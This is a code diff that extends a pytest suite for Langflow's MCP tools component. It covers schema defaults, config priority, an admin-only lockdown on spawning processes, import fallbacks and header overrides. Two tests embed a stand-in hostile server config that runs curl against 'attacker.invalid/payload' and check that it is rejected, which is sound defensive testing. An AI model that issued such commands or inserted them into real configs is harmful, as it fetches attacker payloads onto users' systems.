@@ -5,12 +5,19 @@ This test suite validates the MCP component functionality using real MCP servers
 - HTTP/SSE servers (streamable HTTP mode) - provides various tools
 """
 
+import re
 import shutil
+from contextlib import contextmanager
+from types import SimpleNamespace
 from unittest.mock import AsyncMock, MagicMock, patch
 
 import pytest
+from langflow.services.deps import get_settings_service
 from lfx.base.mcp.util import MCPSessionManager, MCPStdioClient, MCPStreamableHttpClient
 from lfx.components.models_and_agents.mcp_component import MCPToolsComponent
+from lfx.inputs.inputs import BoolInput, MessageTextInput, NestedDictInput
+from lfx.schema.json_schema import create_input_schema_from_json_schema
+from lfx.services.shared_component_cache.service import SharedComponentCacheService
 
 from tests.base import ComponentTestBaseWithoutClient, VersionComponentMapping
 
@@ -29,13 +36,23 @@ class TestMCPToolsComponent(ComponentTestBaseWithoutClient):
             "command": "npx -y @modelcontextprotocol/server-everything",
             "sse_url": "https://mcp.deepwiki.com/sse",
             "tool": "echo",
-            "mcp_server": {"name": "test_server", "config": {"command": "uvx mcp-server-fetch"}},
+            "mcp_server": {
+                "name": "test_server",
+                "config": {"command": "uvx", "args": ["mcp-server-fetch"]},
+            },
         }
 
     @pytest.fixture
     def file_names_mapping(self) -> list[VersionComponentMapping]:
         """Return the file names mapping for different versions."""
         return []
+
+    @pytest.fixture
+    def skipped_outputs(self):
+        return {
+            "component_as_tool": "needs a database user and starts the MCP server in default_kwargs",
+            "response": "calls a tool on the MCP server in default_kwargs",
+        }
 
     @pytest.mark.asyncio
     @pytest.mark.skipif(not shutil.which("npx"), reason="Node.js not available")
@@ -52,6 +69,86 @@ class TestMCPToolsComponent(ComponentTestBaseWithoutClient):
         # Check that the component has a session manager
         session_manager = component.stdio_client._get_session_manager()
         assert isinstance(session_manager, MCPSessionManager)
+
+
+class TestMCPToolsComponentSchemaHandling:
+    @pytest.fixture
+    def component(self):
+        return MCPToolsComponent()
+
+    @staticmethod
+    def _browser_use_schema():
+        return {
+            "type": "object",
+            "properties": {
+                "task": {"type": "string"},
+                "model": {
+                    "anyOf": [{"type": "string"}, {"type": "null"}],
+                    "default": "claude-sonnet-4.6",
+                },
+                "profile_id": {
+                    "anyOf": [{"type": "string"}, {"type": "null"}],
+                    "default": None,
+                },
+                "keep_alive": {
+                    "anyOf": [{"type": "boolean"}, {"type": "null"}],
+                    "default": False,
+                },
+                "output_schema": {
+                    "anyOf": [{"type": "object"}, {"type": "null"}],
+                    "default": None,
+                },
+                "proxy_country": {
+                    "anyOf": [{"type": "string"}, {"type": "null"}],
+                    "default": "us",
+                },
+            },
+            "required": ["task"],
+        }
+
+    @pytest.mark.asyncio
+    async def test_validate_schema_inputs_preserves_mcp_defaults(self, component):
+        mock_tool = MagicMock()
+        mock_tool.name = "run_session"
+        mock_tool.args_schema = create_input_schema_from_json_schema(self._browser_use_schema())
+
+        inputs = await component._validate_schema_inputs(mock_tool)
+        input_map = {input_.name: input_ for input_ in inputs}
+
+        assert isinstance(input_map["task"], MessageTextInput)
+        assert input_map["task"].required is True
+
+        assert isinstance(input_map["model"], MessageTextInput)
+        assert input_map["model"].value == "claude-sonnet-4.6"
+
+        assert isinstance(input_map["keep_alive"], BoolInput)
+        assert input_map["keep_alive"].value is False
+
+        assert isinstance(input_map["output_schema"], NestedDictInput)
+        assert input_map["output_schema"].value is None
+
+        assert isinstance(input_map["proxy_country"], MessageTextInput)
+        assert input_map["proxy_country"].value == "us"
+
+    def test_build_tool_kwargs_omits_blank_optional_values(self, component):
+        args_schema = create_input_schema_from_json_schema(self._browser_use_schema())
+        component.set_attributes(
+            {
+                "task": "Open docs homepage",
+                "model": "",
+                "profile_id": "",
+                "keep_alive": False,
+                "output_schema": {},
+                "proxy_country": "",
+            }
+        )
+
+        kwargs = component._build_tool_kwargs(args_schema)
+
+        assert kwargs == {
+            "task": "Open docs homepage",
+            "keep_alive": False,
+        }
 
 
 class TestMCPToolsComponentIntegration:
@@ -524,8 +621,8 @@ class TestMCPComponentConfigPriority:
         """Test that database config takes priority over config from mcp_server value."""
         # Set up component with a server config in the value
         value_config = {
-            "command": "uvx mcp-server-from-value",
-            "args": ["--test"],
+            "command": "curl",
+            "args": ["https://attacker.invalid/payload"],
             "env": {"TEST": "value"},
         }
         component.mcp_server = {"name": "test_server", "config": value_config}
@@ -533,8 +630,8 @@ class TestMCPComponentConfigPriority:
 
         # Mock the database get_server to return a different config
         db_config = {
-            "command": "uvx mcp-server-from-database",
-            "args": ["--prod"],
+            "command": "uvx",
+            "args": ["mcp-server-from-database", "--prod"],
             "env": {"TEST": "database"},
         }
 
@@ -544,7 +641,7 @@ class TestMCPComponentConfigPriority:
             patch("lfx.components.models_and_agents.mcp_component.session_scope"),
             patch.object(component.stdio_client, "connect_to_server") as mock_connect,
         ):
-            mock_get_user.return_value = MagicMock(id="test_user_123")
+            mock_get_user.return_value = SimpleNamespace(id="test_user_123", is_superuser=True)
             mock_get_server.return_value = db_config
             mock_connect.return_value = []
 
@@ -553,9 +650,9 @@ class TestMCPComponentConfigPriority:
 
             # Verify that connect_to_server was called
             mock_connect.assert_called_once()
-            call_args = mock_connect.call_args
-            # The config passed should be from database, not value
-            assert call_args is not None
+            full_command = mock_connect.call_args.args[0]
+            # The validated database config must win over the unsafe embedded fallback.
+            assert full_command == "uvx mcp-server-from-database --prod"
 
             # Database should be queried first
             mock_get_server.assert_called_once()
@@ -569,8 +666,8 @@ class TestMCPComponentConfigPriority:
 
         # Mock the database get_server to return a config
         db_config = {
-            "command": "uvx mcp-server-from-database",
-            "args": ["--prod"],
+            "command": "uvx",
+            "args": ["mcp-server-from-database", "--prod"],
             "env": {"TEST": "database"},
         }
 
@@ -580,7 +677,7 @@ class TestMCPComponentConfigPriority:
             patch("lfx.components.models_and_agents.mcp_component.session_scope"),
             patch.object(component.stdio_client, "connect_to_server") as mock_connect,
         ):
-            mock_get_user.return_value = MagicMock(id="test_user_123")
+            mock_get_user.return_value = SimpleNamespace(id="test_user_123", is_superuser=True)
             mock_get_server.return_value = db_config
             mock_connect.return_value = []
 
@@ -598,8 +695,8 @@ class TestMCPComponentConfigPriority:
         """Test that value config is used as fallback when server not in database."""
         # Set up component with server name and config in value
         value_config = {
-            "command": "uvx mcp-server-from-value",
-            "args": ["--test"],
+            "command": "uvx",
+            "args": ["mcp-server-from-value", "--test"],
         }
         component.mcp_server = {"name": "new_server", "config": value_config}
         component._user_id = "test_user_123"
@@ -610,7 +707,7 @@ class TestMCPComponentConfigPriority:
             patch("lfx.components.models_and_agents.mcp_component.session_scope"),
             patch.object(component.stdio_client, "connect_to_server") as mock_connect,
         ):
-            mock_get_user.return_value = MagicMock(id="test_user_123")
+            mock_get_user.return_value = SimpleNamespace(id="test_user_123", is_superuser=True)
             # Database returns None (server not found)
             mock_get_server.return_value = None
             mock_connect.return_value = []
@@ -625,12 +722,131 @@ class TestMCPComponentConfigPriority:
             mock_connect.assert_called_once()
 
     @pytest.mark.asyncio
+    async def test_missing_named_server_fails_with_actionable_error(self, component):
+        """A portable flow must identify the server registration required on the target."""
+        component.mcp_server = {"name": "production_server"}
+        component._user_id = "test_user_123"
+
+        with (
+            patch("langflow.api.v2.mcp.get_server") as mock_get_server,
+            patch("langflow.services.database.models.user.crud.get_user_by_id") as mock_get_user,
+            patch("lfx.components.models_and_agents.mcp_component.session_scope"),
+            patch("lfx.components.models_and_agents.mcp_component.update_tools") as mock_update_tools,
+        ):
+            mock_get_user.return_value = SimpleNamespace(id="test_user_123", is_superuser=True)
+            mock_get_server.return_value = None
+
+            with pytest.raises(
+                ValueError,
+                match=re.escape(
+                    "MCP server 'production_server' is not configured. "
+                    "Add a server with this name in Settings > MCP Servers before running this flow."
+                ),
+            ):
+                await component.update_tool_list()
+
+            mock_update_tools.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_value_config_respects_code_execution_lockdown(self, component, monkeypatch):
+        """An imported stdio config cannot bypass the non-admin process policy."""
+        component.mcp_server = {
+            "name": "embedded_stdio",
+            "config": {"command": "uvx", "args": ["mcp-server-fetch"]},
+        }
+        component._user_id = "test_user_123"
+        settings = get_settings_service().settings
+        monkeypatch.setattr(settings, "allow_custom_components", True)
+        monkeypatch.setattr(settings, "custom_component_admin_only", True)
+        monkeypatch.setattr(settings, "block_code_interpreter_components", False)
+
+        with (
+            patch("langflow.api.v2.mcp.get_server") as mock_get_server,
+            patch("langflow.services.database.models.user.crud.get_user_by_id") as mock_get_user,
+            patch("lfx.components.models_and_agents.mcp_component.session_scope"),
+            patch.object(component.stdio_client, "connect_to_server") as mock_connect,
+        ):
+            mock_get_user.return_value = SimpleNamespace(id="test_user_123", is_superuser=False)
+            mock_get_server.return_value = None
+
+            with pytest.raises(ValueError, match="restricted to administrators"):
+                await component.update_tool_list()
+
+            mock_connect.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_cached_stdio_config_rechecks_code_execution_lockdown(self, component, monkeypatch):
+        """A cached stdio tool list must not outlive a newly enabled lockdown."""
+        server_name = "embedded_stdio"
+        server_config = {"command": "uvx", "args": ["mcp-server-fetch"]}
+        cached_tool = SimpleNamespace(name="cached-tool")
+        component.mcp_server = {"name": server_name, "config": server_config}
+        component._user_id = "test_user_123"
+        component._vertex = SimpleNamespace(graph=SimpleNamespace(session_id="test-session"))
+        component.use_cache = True
+
+        cache_key = component._mcp_servers_cache_key(server_name, server_config)
+        servers_cache = {
+            cache_key: {
+                "tools": [cached_tool],
+                "tool_cache": {"cached-tool": cached_tool},
+                "config": server_config,
+            }
+        }
+        monkeypatch.setattr(
+            "lfx.components.models_and_agents.mcp_component.safe_cache_get",
+            lambda _cache, key, default=None: servers_cache if key == "servers" else default,
+        )
+
+        settings = get_settings_service().settings
+        monkeypatch.setattr(settings, "allow_custom_components", True)
+        monkeypatch.setattr(settings, "custom_component_admin_only", True)
+        monkeypatch.setattr(settings, "block_code_interpreter_components", False)
+
+        with (
+            patch("langflow.api.v2.mcp.get_server") as mock_get_server,
+            patch("langflow.services.database.models.user.crud.get_user_by_id") as mock_get_user,
+            patch("lfx.components.models_and_agents.mcp_component.session_scope"),
+            patch.object(component.stdio_client, "connect_to_server") as mock_connect,
+        ):
+            mock_get_user.return_value = SimpleNamespace(id="test_user_123", is_superuser=False)
+
+            with pytest.raises(ValueError, match="restricted to administrators"):
+                await component.update_tool_list()
+
+            mock_get_server.assert_not_called()
+            mock_connect.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_unsafe_value_config_is_rejected_when_not_in_database(self, component):
+        """An embedded fallback must be rejected before the stdio client is used."""
+        component.mcp_server = {
+            "name": "unsafe_server",
+            "config": {"command": "curl", "args": ["https://attacker.invalid/payload"]},
+        }
+        component._user_id = "test_user_123"
+
+        with (
+            patch("langflow.api.v2.mcp.get_server") as mock_get_server,
+            patch("langflow.services.database.models.user.crud.get_user_by_id") as mock_get_user,
+            patch("lfx.components.models_and_agents.mcp_component.session_scope"),
+            patch.object(component.stdio_client, "connect_to_server") as mock_connect,
+        ):
+            mock_get_user.return_value = SimpleNamespace(id="test_user_123", is_superuser=True)
+            mock_get_server.return_value = None
+
+            with pytest.raises(ValueError, match="Command 'curl' is not allowed"):
+                await component.update_tool_list()
+
+            mock_connect.assert_not_called()
+
+    @pytest.mark.asyncio
     async def test_rest_api_new_server_scenario(self, component):
         """Test REST API scenario where tweaks provide config for a new server not in database."""
         # Simulate REST API call with tweaks providing full config for a new server
         api_provided_config = {
-            "command": "uvx mcp-server-api-new",
-            "args": ["--api-mode"],
+            "command": "uvx",
+            "args": ["mcp-server-api-new", "--api-mode"],
             "env": {"API_KEY": "secret123"},  # pragma: allowlist secret
         }
         component.mcp_server = {"name": "new_api_server", "config": api_provided_config}
@@ -642,7 +858,7 @@ class TestMCPComponentConfigPriority:
             patch("lfx.components.models_and_agents.mcp_component.session_scope"),
             patch.object(component.stdio_client, "connect_to_server") as mock_connect,
         ):
-            mock_get_user.return_value = MagicMock(id="api_user_456")
+            mock_get_user.return_value = SimpleNamespace(id="api_user_456", is_superuser=True)
             # Database returns None (server not in database yet)
             mock_get_server.return_value = None
             mock_connect.return_value = []
@@ -655,6 +871,409 @@ class TestMCPComponentConfigPriority:
 
             # Connect should be called with API-provided config as fallback
 
+    # Tests below patch `builtins.__import__` to simulate import failures. This is a
+    # heavyweight approach — the patch intercepts *every* import executed while active,
+    # including unrelated library code pulled in by awaits, mocks, or assertions — but
+    # targeted alternatives (sys.modules / importlib) do not reliably reproduce the
+    # `ModuleNotFoundError` raised from an `import langflow.*` statement inside the
+    # code under test. The `real_import` fallback forwards all non-matching names to
+    # the real import machinery; the `name`-prefix guard in each fake_import is kept
+    # as tight as possible so surrounding test plumbing is not affected.
+
+    @pytest.mark.asyncio
+    async def test_update_tool_list_falls_back_to_value_config_when_langflow_absent(self, component):
+        """Test LFX standalone mode falls back to value config when Langflow is unavailable.
+
+        Regression test: when lfx is run without the full Langflow package installed
+        (e.g., serving a flow via `lfx`), importing `langflow.api.v2.mcp` raises
+        ModuleNotFoundError. The component must gracefully fall back to the server
+        config embedded in the flow JSON (server_config_from_value) rather than failing.
+        """
+        import builtins
+
+        value_config = {
+            "command": "uvx",
+            "args": ["mcp-server-from-value", "--standalone"],
+        }
+        component.mcp_server = {"name": "standalone_server", "config": value_config}
+        component._user_id = "test_user_123"
+
+        real_import = builtins.__import__
+        langflow_prefixes = ("langflow.api.v2.mcp", "langflow.services.database")
+
+        def fake_import(name, import_globals=None, import_locals=None, fromlist=(), level=0):
+            if any(name == p or name.startswith(p + ".") for p in langflow_prefixes):
+                raise ModuleNotFoundError(name=name)
+            return real_import(name, import_globals, import_locals, fromlist, level)
+
+        with (
+            patch("builtins.__import__", side_effect=fake_import),
+            patch("lfx.components.models_and_agents.mcp_component.update_tools") as mock_update_tools,
+        ):
+            mock_update_tools.return_value = (None, [], {})
+
+            # Must not raise — should fall back to value config
+            _tools, server_info = await component.update_tool_list()
+
+            # update_tools should have been called with the value config as a fallback
+            mock_update_tools.assert_called_once()
+            call_kwargs = mock_update_tools.call_args.kwargs
+            assert call_kwargs["server_name"] == "standalone_server"
+            assert call_kwargs["server_config"]["command"] == "uvx"
+            assert call_kwargs["server_config"]["args"] == ["mcp-server-from-value", "--standalone"]
+
+            # server_info should echo the resolved value config
+            assert server_info["name"] == "standalone_server"
+            assert server_info["config"]["command"] == "uvx"
+
+    @pytest.mark.asyncio
+    async def test_update_tool_list_surfaces_transitive_import_error_instead_of_falling_back(self, component):
+        """A transitive ModuleNotFoundError inside Langflow must NOT be silently swallowed.
+
+        If a Langflow dependency (e.g. sqlmodel) fails to import while loading
+        langflow.services.database.models.user.crud, that's a real bug in the full
+        Langflow stack — not LFX standalone mode. We must not silently fall back
+        to the flow-embedded config, because the database config is supposed to
+        take precedence when Langflow is available.
+        """
+        import builtins
+
+        component.mcp_server = {
+            "name": "broken_server",
+            "config": {"command": "uvx", "args": ["mcp-server-from-value"]},
+        }
+        component._user_id = "test_user_123"
+
+        real_import = builtins.__import__
+
+        transitive_error_msg = "No module named 'sqlmodel'"
+
+        def fake_import(name, import_globals=None, import_locals=None, fromlist=(), level=0):
+            # Simulate a transitive dependency failure: sqlmodel is the missing module,
+            # not a Langflow module. This should NOT be treated as standalone mode.
+            if name.startswith("langflow.services.database"):
+                raise ModuleNotFoundError(transitive_error_msg, name="sqlmodel")
+            return real_import(name, import_globals, import_locals, fromlist, level)
+
+        with (
+            patch("builtins.__import__", side_effect=fake_import),
+            patch("lfx.components.models_and_agents.mcp_component.update_tools") as mock_update_tools,
+        ):
+            mock_update_tools.return_value = (None, [], {})
+
+            # The transitive ImportError must surface (wrapped as ValueError by the
+            # outer handler in update_tool_list); update_tools must NOT be called.
+            with pytest.raises(ValueError, match="Error updating tool list") as exc_info:
+                await component.update_tool_list()
+
+            # The original ModuleNotFoundError for sqlmodel should be preserved as __cause__
+            assert isinstance(exc_info.value.__cause__, ModuleNotFoundError)
+            assert exc_info.value.__cause__.name == "sqlmodel"
+
+            mock_update_tools.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_update_tool_list_surfaces_plain_import_error_instead_of_falling_back(self, component):
+        """A plain ImportError (attribute missing, not module missing) must surface.
+
+        Regression test for the intentional `except ModuleNotFoundError` narrowing: if
+        an installed Langflow no longer exposes `get_server` or `get_user_by_id` (real
+        API break), the resulting ImportError — which is NOT a ModuleNotFoundError —
+        must NOT be swallowed as standalone mode. It must propagate to the outer
+        handler and surface as a `ValueError("Error updating tool list: ...")`.
+        """
+        import builtins
+
+        component.mcp_server = {
+            "name": "broken_server",
+            "config": {"command": "uvx", "args": ["mcp-server-from-value"]},
+        }
+        component._user_id = "test_user_123"
+
+        real_import = builtins.__import__
+
+        def fake_import(name, import_globals=None, import_locals=None, fromlist=(), level=0):
+            # The module imports fine, but a specific attribute is missing — this
+            # raises plain ImportError (not ModuleNotFoundError) at the `from ... import`
+            # line. Emulate that by raising ImportError when this module is requested
+            # with a fromlist, just as `from langflow.api.v2.mcp import get_server` would.
+            if name == "langflow.api.v2.mcp" and fromlist and "get_server" in fromlist:
+                msg = "cannot import name 'get_server' from 'langflow.api.v2.mcp'"
+                raise ImportError(msg, name="langflow.api.v2.mcp")
+            return real_import(name, import_globals, import_locals, fromlist, level)
+
+        with (
+            patch("builtins.__import__", side_effect=fake_import),
+            patch("lfx.components.models_and_agents.mcp_component.update_tools") as mock_update_tools,
+        ):
+            mock_update_tools.return_value = (None, [], {})
+
+            with pytest.raises(ValueError, match="Error updating tool list") as exc_info:
+                await component.update_tool_list()
+
+            # The original ImportError should be preserved as __cause__ — it must not
+            # have been silently converted into a fallback path.
+            assert isinstance(exc_info.value.__cause__, ImportError)
+            assert not isinstance(exc_info.value.__cause__, ModuleNotFoundError)
+
+            mock_update_tools.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_update_tool_list_surfaces_lfx_services_deps_missing(self, component):
+        """A ModuleNotFoundError for an lfx module (not langflow.*) must surface.
+
+        Edge-case regression test: if `lfx.services.deps` itself is missing (a
+        packaging error inside lfx), the prefix check `missing_module == "langflow"
+        or missing_module.startswith("langflow.")` correctly returns False and the
+        error is re-raised. Locks in the intended precedence rule so a future rewrite
+        of the prefix check cannot silently convert this into a standalone fallback.
+        """
+        import builtins
+
+        component.mcp_server = {
+            "name": "broken_server",
+            "config": {"command": "uvx", "args": ["mcp-server-from-value"]},
+        }
+        component._user_id = "test_user_123"
+
+        real_import = builtins.__import__
+
+        deps_missing_msg = "No module named 'lfx.services.deps'"
+
+        def fake_import(name, import_globals=None, import_locals=None, fromlist=(), level=0):
+            if name == "lfx.services.deps" or name.startswith("lfx.services.deps."):
+                raise ModuleNotFoundError(deps_missing_msg, name="lfx.services.deps")
+            return real_import(name, import_globals, import_locals, fromlist, level)
+
+        with (
+            patch("builtins.__import__", side_effect=fake_import),
+            patch("lfx.components.models_and_agents.mcp_component.update_tools") as mock_update_tools,
+        ):
+            mock_update_tools.return_value = (None, [], {})
+
+            with pytest.raises(ValueError, match="Error updating tool list") as exc_info:
+                await component.update_tool_list()
+
+            assert isinstance(exc_info.value.__cause__, ModuleNotFoundError)
+            assert exc_info.value.__cause__.name == "lfx.services.deps"
+
+            mock_update_tools.assert_not_called()
+
+
+class TestMCPComponentGlobalVariableResolution:
+    """Header global variables must resolve even when a request overrides some of them.
+
+    Regression coverage for #14602: loading global variables from the database was
+    skipped whenever the request carried any override, so a header bound to a
+    non-overridden variable was sent upstream with the literal variable name as its
+    value instead of the stored secret.
+    """
+
+    USER_ID = "11111111-1111-1111-1111-111111111111"
+    SERVER_CONFIG = {
+        "url": "https://echo.invalid/mcp",
+        "headers": {"X-Auth1": "AUTH-VAR1", "X-Auth2": "AUTH-VAR2"},
+    }
+    DB_VARIABLES = {"AUTH-VAR1": "var1-placeholder", "AUTH-VAR2": "my-api-key"}
+
+    async def _run(self, context_variables, server_config=None):
+        """Drive update_tool_list and return (request_variables passed on, variable_service)."""
+        component = MCPToolsComponent()
+        component.mcp_server = "test_server"
+        component._user_id = self.USER_ID
+        if context_variables is not None:
+            # ``graph`` is a read-only property backed by ``_vertex.graph``.
+            component._vertex = SimpleNamespace(graph=SimpleNamespace(context={"request_variables": context_variables}))
+
+        variable_service = MagicMock()
+        variable_service.get_all_decrypted_variables = AsyncMock(return_value=dict(self.DB_VARIABLES))
+
+        with (
+            patch(
+                "langflow.api.v2.mcp.get_server",
+                new=AsyncMock(return_value=dict(server_config if server_config is not None else self.SERVER_CONFIG)),
+            ),
+            patch(
+                "langflow.services.database.models.user.crud.get_user_by_id",
+                new=AsyncMock(return_value=MagicMock(id=self.USER_ID)),
+            ),
+            patch("lfx.components.models_and_agents.mcp_component.session_scope"),
+            patch("lfx.services.deps.get_variable_service", return_value=variable_service),
+            patch(
+                "lfx.components.models_and_agents.mcp_component.update_tools",
+                new=AsyncMock(return_value=("Streamable_HTTP", [], {})),
+            ) as mock_update_tools,
+        ):
+            await component.update_tool_list()
+
+        return mock_update_tools.call_args.kwargs["request_variables"], variable_service
+
+    @pytest.mark.asyncio
+    async def test_database_variables_loaded_without_request_override(self):
+        """Baseline: with no per-request override every global variable is loaded."""
+        resolved, _ = await self._run(None)
+
+        assert resolved == self.DB_VARIABLES
+
+    @pytest.mark.asyncio
+    async def test_request_override_merges_with_database_variables(self):
+        """A partial override must not suppress the database load for other variables."""
+        resolved, _ = await self._run({"AUTH-VAR1": "my-session-api-key"})
+
+        assert resolved == {"AUTH-VAR1": "my-session-api-key", "AUTH-VAR2": "my-api-key"}
+
+    @pytest.mark.asyncio
+    async def test_non_overridden_header_resolves_to_stored_value(self):
+        """The variable name must never reach the upstream server as a header value."""
+        from lfx.base.mcp.util import _process_headers
+
+        resolved, _ = await self._run({"AUTH-VAR1": "my-session-api-key"})
+        headers = _process_headers(dict(self.SERVER_CONFIG["headers"]), resolved)
+
+        assert headers == {"x-auth1": "my-session-api-key", "x-auth2": "my-api-key"}
+
+    @pytest.mark.asyncio
+    async def test_no_database_query_when_config_has_no_headers(self):
+        """The load stays skipped for header-less servers, preserving the fast path."""
+        _, variable_service = await self._run(None, server_config={"url": "https://echo.invalid/mcp"})
+
+        variable_service.get_all_decrypted_variables.assert_not_called()
+
+
+class TestMCPComponentHeaderOverrideWriteBack:
+    """Component header overrides apply to discovery only, never to the saved server config.
+
+    ``update_tool_list`` returns the server config that ``update_build_config`` writes back
+    to ``mcp_server.value``. When the server has no database config (an imported flow, or
+    LFX standalone) that inline config is the only source, so a component override merged
+    into it would replace the inline header for good: clearing the override later would
+    leave the override value in place.
+    """
+
+    USER_ID = "11111111-1111-1111-1111-111111111111"
+    SERVER_NAME = "inline_server"
+    INLINE_HEADERS = {"Authorization": "Bearer inline", "X-Tenant": "inline-tenant"}
+    OVERRIDE_HEADERS = [
+        {"key": "Authorization", "value": "Bearer override"},
+        {"key": "X-Extra", "value": "component-only"},
+    ]
+
+    def _server_value(self):
+        return {
+            "name": self.SERVER_NAME,
+            "config": {"url": "https://echo.invalid/mcp", "headers": dict(self.INLINE_HEADERS)},
+        }
+
+    @staticmethod
+    def _build_config(server_value):
+        return {
+            "mcp_server": {"value": server_value},
+            "tool": {"show": True, "options": [], "value": "", "placeholder": ""},
+            "tool_placeholder": {"tool_mode": False},
+            "tools_metadata": {"show": False},
+        }
+
+    @contextmanager
+    def _discovery(self):
+        """Stub the database and the MCP round-trip; yield the headers each discovery used."""
+        discovered_headers: list[dict] = []
+
+        async def fake_update_tools(**kwargs):
+            # Snapshot at call time so a later in-place edit of the config cannot hide a leak.
+            discovered_headers.append(dict(kwargs["server_config"].get("headers") or {}))
+            return "Streamable_HTTP", [], {}
+
+        with (
+            # No database config: the inline config in ``mcp_server.value`` is the only source.
+            patch("langflow.api.v2.mcp.get_server", new=AsyncMock(return_value=None)),
+            patch(
+                "langflow.services.database.models.user.crud.get_user_by_id",
+                new=AsyncMock(return_value=SimpleNamespace(id=self.USER_ID, is_superuser=True)),
+            ),
+            patch("lfx.components.models_and_agents.mcp_component.session_scope"),
+            patch("lfx.components.models_and_agents.mcp_component.update_tools", new=fake_update_tools),
+        ):
+            yield discovered_headers
+
+    @pytest.mark.asyncio
+    async def test_override_is_used_for_discovery_but_not_returned(self):
+        component = MCPToolsComponent()
+        component._user_id = self.USER_ID
+        component.mcp_server = self._server_value()
+        component.headers = self.OVERRIDE_HEADERS
+
+        with self._discovery() as discovered_headers:
+            _tools, server_info = await component.update_tool_list()
+
+        assert discovered_headers == [
+            {"Authorization": "Bearer override", "X-Tenant": "inline-tenant", "X-Extra": "component-only"}
+        ]
+        assert server_info["name"] == self.SERVER_NAME
+        assert server_info["config"]["headers"] == self.INLINE_HEADERS
+        # The inline config held by the component must not be edited in place either.
+        assert component.mcp_server["config"]["headers"] == self.INLINE_HEADERS
+
+    @pytest.mark.asyncio
+    async def test_clearing_override_restores_inline_header(self):
+        component = MCPToolsComponent()
+        component._user_id = self.USER_ID
+        component.mcp_server = self._server_value()
+        component.headers = self.OVERRIDE_HEADERS
+
+        with self._discovery() as discovered_headers:
+            _tools, server_info = await component.update_tool_list()
+            # The flow saves the returned value, then the user clears the override.
+            component.mcp_server = server_info
+            component.headers = []
+            _tools, server_info = await component.update_tool_list()
+
+        assert discovered_headers[0]["Authorization"] == "Bearer override"
+        assert discovered_headers[1] == self.INLINE_HEADERS
+        assert server_info["config"]["headers"] == self.INLINE_HEADERS
+
+    @pytest.mark.asyncio
+    async def test_build_config_write_back_keeps_inline_header(self):
+        component = MCPToolsComponent()
+        component._user_id = self.USER_ID
+        component.use_cache = False
+        component.headers = self.OVERRIDE_HEADERS
+        server_value = self._server_value()
+
+        with self._discovery() as discovered_headers:
+            build_config = await component.update_build_config(
+                self._build_config(server_value), server_value, "mcp_server"
+            )
+
+        assert discovered_headers[0]["Authorization"] == "Bearer override"
+        assert build_config["mcp_server"]["value"]["name"] == self.SERVER_NAME
+        assert build_config["mcp_server"]["value"]["config"]["headers"] == self.INLINE_HEADERS
+
+    @pytest.mark.asyncio
+    async def test_shared_cache_entry_keeps_inline_header(self, monkeypatch):
+        cache = SharedComponentCacheService()
+        monkeypatch.setattr(
+            "lfx.custom.custom_component.component_with_cache.get_shared_component_cache_service",
+            lambda: cache,
+        )
+        component = MCPToolsComponent()
+        component._user_id = self.USER_ID
+        # Give the shared cache a full caller scope, a user and a Langflow session.
+        component._vertex = SimpleNamespace(
+            graph=SimpleNamespace(session_id="session-1", flow_id="flow-1", context={}, user_id=self.USER_ID)
+        )
+        component.use_cache = True
+        component.mcp_server = self._server_value()
+        component.headers = self.OVERRIDE_HEADERS
+
+        with self._discovery() as discovered_headers:
+            await component.update_tool_list()
+            # Same override, same cache key: the second call is served from the shared cache.
+            _tools, server_info = await component.update_tool_list()
+
+        assert len(discovered_headers) == 1
+        assert discovered_headers[0]["Authorization"] == "Bearer override"
+        assert server_info["config"]["headers"] == self.INLINE_HEADERS
+
 
 # ============================================================================
 # Tests for resolve_mcp_config pure function
@@ -665,8 +1284,8 @@ def test_resolve_config_db_takes_priority():
     """Test that database config takes priority over value config."""
     from lfx.components.models_and_agents.mcp_component import resolve_mcp_config
 
-    db_config = {"command": "uvx from-db", "args": ["--prod"]}
-    value_config = {"command": "uvx from-value", "args": ["--test"]}
+    db_config = {"command": "uvx", "args": ["from-db", "--prod"]}
+    value_config = {"command": "uvx", "args": ["from-value", "--test"]}
 
     result = resolve_mcp_config("test_server", value_config, db_config)
 
@@ -677,7 +1296,7 @@ def test_resolve_config_falls_back_to_value():
     """Test that value config is used when DB returns None."""
     from lfx.components.models_and_agents.mcp_component import resolve_mcp_config
 
-    value_config = {"command": "uvx from-value", "args": ["--test"]}
+    value_config = {"command": "uvx", "args": ["from-value", "--test"]}
 
     result = resolve_mcp_config("test_server", value_config, None)
 
@@ -703,8 +1322,8 @@ def mock_db_session_with_servers():
     class MockSession:
         def __init__(self):
             self.servers = {
-                "test_server": {"command": "uvx test", "args": []},
-                "prod_server": {"command": "uvx prod", "args": ["--prod"]},
+                "test_server": {"command": "uvx", "args": ["test"]},
+                "prod_server": {"command": "uvx", "args": ["prod", "--prod"]},
             }
 
         async def __aenter__(self):
@@ -738,10 +1357,11 @@ async def test_config_priority_with_fixtures(mock_db_session_with_servers):
         ),
         patch.object(component.stdio_client, "connect_to_server", return_value=[]),
     ):
-        mock_get_user.return_value = MagicMock(id="test_user")
-        mock_get_server.return_value = {"command": "uvx test", "args": []}
+        mock_get_user.return_value = SimpleNamespace(id="test_user", is_superuser=True)
+        mock_get_server.return_value = {"command": "uvx", "args": ["test"]}
 
         _tools, server_info = await component.update_tool_list()
 
     # Verify behavior without needing to assert on mocks
-    assert server_info["config"]["command"] == "uvx test"  # From DB
+    assert server_info["config"]["command"] == "uvx"  # From DB
+    assert server_info["config"]["args"] == ["test"]
